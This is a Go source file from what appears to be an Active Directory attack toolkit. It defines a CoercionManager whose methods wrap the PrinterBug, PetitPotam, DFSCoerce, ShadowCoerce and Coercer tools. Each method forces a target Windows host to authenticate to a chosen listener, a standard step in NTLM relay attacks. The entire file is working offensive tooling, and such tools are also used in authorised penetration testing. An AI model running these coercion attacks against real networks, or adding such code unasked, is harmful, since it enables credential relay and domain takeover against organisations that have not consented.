package modules

import (
	"adpack/utils"
	"fmt"
	"strings"
)

type CoercionManager struct{}

func (c *CoercionManager) PrinterBug(target, listen string) error {
	if strings.TrimSpace(target) == "" || strings.TrimSpace(listen) == "" {
		return fmt.Errorf("invalid argument: target and listen must be non-empty")
	}
	utils.Step(fmt.Sprintf("PrinterBug: coercing %s → %s...", target, listen))
	result := utils.RunCommand("printerbug.py", target, listen)
	if !result.Success {
		return fmt.Errorf("printerbug failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (c *CoercionManager) PetitPotam(target, listen string) error {
	if strings.TrimSpace(target) == "" || strings.TrimSpace(listen) == "" {
		return fmt.Errorf("invalid argument: target and listen must be non-empty")
	}
	utils.Step(fmt.Sprintf("PetitPotam: coercing %s → %s...", target, listen))
	result := utils.RunCommand("PetitPotam.py", "-d", target, listen, target)
	if !result.Success {
		return fmt.Errorf("petitpotam failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (c *CoercionManager) DFSCoerce(target, listen string) error {
	if strings.TrimSpace(target) == "" || strings.TrimSpace(listen) == "" {
		return fmt.Errorf("invalid argument: target and listen must be non-empty")
	}
	utils.Step(fmt.Sprintf("DFSCoerce: coercing %s → %s...", target, listen))
	result := utils.RunCommand("dfscoerce.py", "-d", target, listen, target)
	if !result.Success {
		return fmt.Errorf("dfscoerce failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (c *CoercionManager) ShadowCoerce(target, listen string) error {
	if strings.TrimSpace(target) == "" || strings.TrimSpace(listen) == "" {
		return fmt.Errorf("invalid argument: target and listen must be non-empty")
	}
	utils.Step(fmt.Sprintf("ShadowCoerce: coercing %s → %s...", target, listen))
	result := utils.RunCommand("shadowcoerce.py", "-d", target, listen, target)
	if !result.Success {
		return fmt.Errorf("shadowcoerce failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}

func (c *CoercionManager) All(target, listen string) error {
	if strings.TrimSpace(target) == "" || strings.TrimSpace(listen) == "" {
		return fmt.Errorf("invalid argument: target and listen must be non-empty")
	}
	utils.Step(fmt.Sprintf("Coercer scanner: %s → %s...", target, listen))
	result := utils.RunCommand("Coercer", "coerce", "-t", target, "-l", listen)
	if !result.Success {
		return fmt.Errorf("coercer failed: %s", result.Stderr)
	}
	fmt.Println(result.Stdout)
	return nil
}
